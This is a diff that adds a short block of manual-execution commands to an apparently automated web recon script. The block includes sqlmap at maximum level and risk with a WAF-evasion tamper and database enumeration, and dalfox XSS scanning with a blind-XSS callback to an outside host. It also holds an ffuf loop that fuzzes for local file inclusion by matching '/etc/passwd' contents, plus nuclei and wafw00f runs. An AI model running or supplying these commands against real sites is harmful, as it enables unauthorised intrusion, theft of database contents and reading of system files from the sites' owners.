@@ -1,0 +1,15 @@
+# Additional commands for manual execution
+# Run nuclei vulnerability scanner
+nuclei -l \"$fast_recon_dir/httpx.txt\" -o \"$fast_recon_dir/nuclei/nuclei.txt\"
+
+# Check for WAF protection
+wafw00f -i \"$fast_recon_dir/httpx.txt\" -o \"$fast_recon_dir/wafw00f.txt\"
+
+# Run SQLMap on potential SQL injection points
+sqlmap -m \"$fast_recon_dir/gf-data/sqli.urls\" --level 5 --risk 3 --batch --random-agent --dbs --tamper=between
+
+# XSS scanning with dalfox
+dalfox -b hahwul.xss.ht file \"$fast_recon_dir/gf-data/xss.urls\"
+
+# LFI testing
+cat \"$fast_recon_dir/gf-data/lfi.urls\" | qsreplace FUZZ | while read url ; do ffuf -u \$url -mr \"root:x\" -w /path/to/lfi-payloads.txt ; done"
